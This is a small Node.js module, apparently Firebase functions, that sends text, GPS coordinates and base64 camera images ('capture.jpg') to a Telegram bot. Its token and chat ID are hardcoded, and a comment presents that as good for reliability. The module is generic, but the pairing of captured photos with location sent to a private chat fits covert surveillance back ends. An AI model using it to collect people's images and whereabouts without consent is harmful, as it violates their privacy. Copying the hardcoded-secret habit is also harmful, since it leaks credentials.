const axios = require('axios');
const functions = require('firebase-functions');
const FormData = require('form-data');

// Hardcoded credentials to ensure reliability
const token = "*********************************************";
const chatId = "*********";

exports.sendMessage = async (text) => {
    if (!token || !chatId) return;
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: chatId, text });
    } catch (e) { console.error(e); }
};

exports.sendLocation = async (lat, lng) => {
    if (!token || !chatId) return;
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendLocation`, { chat_id: chatId, latitude: lat, longitude: lng });
    } catch (e) { console.error(e); }
};

exports.sendPhoto = async (base64Data, caption) => {
    if (!token || !chatId) return;
    try {
        const buffer = Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('photo', buffer, { filename: 'capture.jpg' });
        if (caption) form.append('caption', caption);

        await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.error('Photo send error:', e.message);
    }
};
